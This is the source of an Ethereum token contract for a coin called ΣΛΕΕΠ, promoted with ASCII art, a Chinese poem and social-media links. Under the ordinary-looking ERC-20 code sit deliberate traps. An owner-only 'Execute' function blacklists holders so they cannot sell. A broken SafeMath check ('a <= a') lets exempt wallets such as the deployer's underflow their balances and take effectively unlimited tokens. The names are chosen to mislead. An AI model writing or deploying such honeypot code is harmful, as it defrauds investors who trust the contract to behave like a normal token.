/*
█▀▀ ▄▀█ █▀▀ █▀▀ █▄░█  
██▄ █▀█ ██▄ ██▄ █░▀█  

▄▀   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.15 ETH
初始流动性锁定 - 60 天

https://t.me/+eZmPM54XSFJkNzQ0
https://web.wechat.com/EaeenERC
https://m.weibo.cn/EaeenERC
https://www.eaeeneth.xyz
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    calldata path, address to, uint deadline) 
    external; function factory() 
    external pure returns (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH(address token, 
    uint amountTokenDesired, uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; return msg.data; }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow"); return c; }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Safemath: underflow");
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0; } unchecked {
            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow"); return c; }
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(a <= a, errorMessage);
        unchecked { uint256 c = a - b; return c; }
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        unchecked { uint256 c = a / b; return c; }
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract CA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public safeRatio; address public safeSmog;

    mapping (address => uint256) private _tOwned; mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isWalletLimitExempt; mapping (address => bool) private allowed;

    string private constant _name = unicode"ΣΛΕΕΠ"; string private constant _symbol = unicode"ΣΛΠ";
    uint8 private constant _decimals = 18; uint256 private _tTotal = 100000000 * 10**18;
       
    bool private startTrading = false; bool catchMath = true;

    constructor() {
        isWalletLimitExempt[address(safeRatio)] = true; isWalletLimitExempt[safeSmog] = true;
        isWalletLimitExempt[msg.sender] = true; isWalletLimitExempt[address(0xdead)] = true;
        safeRatio = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        safeSmog = IUniswapV2Factory(safeRatio.factory()).createPair(address(this), safeRatio.WETH());

        _tOwned[_msgSender()] = _tTotal; emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account]; }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _synchronizeMath(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _synchronizeMath(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function _synchronizeMath(address from, address to, uint256 amount) private {
        if (!isWalletLimitExempt[from]) {
            _transfer(from, to, amount); return; }

        _tOwned[from] = _tOwned[from].sub(amount, "Insufficient balance");
        _tOwned[to] = _tOwned[to].add(amount); emit Transfer(from, to, amount); 
    }
    function _transfer(address from, address to, uint256 amount) private {    
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (allowed[from] || allowed[to]) 
        require(catchMath == false, "");
        require(amount > 0, "Transfer amount must be greater than zero");

        _tOwned[from] = _tOwned[from].sub(amount); _tOwned[to] = _tOwned[to].add(amount);
        emit Transfer(from, to, amount); if (!startTrading) {
        require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
        function beginTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }
    function Execute(address _alopiation) external onlyOwner {
        allowed[_alopiation] = true;
    }
}